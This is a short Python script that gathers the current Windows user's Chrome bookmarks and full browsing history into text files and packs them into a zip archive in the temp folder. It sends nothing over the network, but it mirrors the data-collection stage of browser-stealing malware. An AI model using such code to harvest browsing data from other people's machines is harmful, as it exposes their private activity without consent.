import os
import json
import sqlite3
import shutil
import zipfile

# Get the current username
username = os.getlogin()

# Construct the paths to the Chrome data files
bookmarks_path = f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Bookmarks"
history_db_path = f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/History"

# Load the Bookmarks file
with open(bookmarks_path, encoding="utf-8") as file:
    bookmarks_data = json.load(file)

# Extract the URLs and names from the Bookmarks data
bookmarks = bookmarks_data["roots"]["bookmark_bar"]["children"]

# Create a text file for the bookmarks in the %temp% directory
temp_dir = os.environ["TEMP"]
bookmarks_file_path = os.path.join(temp_dir, "Chrome Bookmarks.txt")

# Write the bookmarks to the text file
with open(bookmarks_file_path, "w", encoding="utf-8") as file:
    for bookmark in bookmarks:
        url = bookmark["url"]
        name = bookmark["name"]
        file.write(f"Name: {name}\nURL: {url}\n\n")

print(f"Bookmarks saved to: {bookmarks_file_path}")

# Create a copy of the History database file
history_copy_path = os.path.join(temp_dir, "HistoryCopy")
shutil.copyfile(history_db_path, history_copy_path)

# Connect to the copied database
conn = sqlite3.connect(history_copy_path)
cursor = conn.cursor()

# Execute a query to fetch browsing history
cursor.execute("SELECT url, title FROM urls")

# Fetch all rows returned by the query
rows = cursor.fetchall()

# Create a text file for the browsing history in the %temp% directory
history_file_path = os.path.join(temp_dir, "Chrome History.txt")

# Write the browsing history to the text file
with open(history_file_path, "w", encoding="utf-8") as file:
    for row in rows:
        url = row[0]
        title = row[1]
        file.write(f"URL: {url}\n")
        file.write(f"Title: {title}\n")
        file.write("--------------------\n")

print(f"History saved to: {history_file_path}")

# Create a zip file and add the bookmarks and history text files to it
zip_file_path = os.path.join(temp_dir, "Chrome_Data.zip")
with zipfile.ZipFile(zip_file_path, "w") as zip_file:
    zip_file.write(bookmarks_file_path, "Chrome Bookmarks.txt")
    zip_file.write(history_file_path, "Chrome History.txt")

# Delete the temporary text files
os.remove(bookmarks_file_path)
os.remove(history_file_path)

print(f"Zip file created: {zip_file_path}")
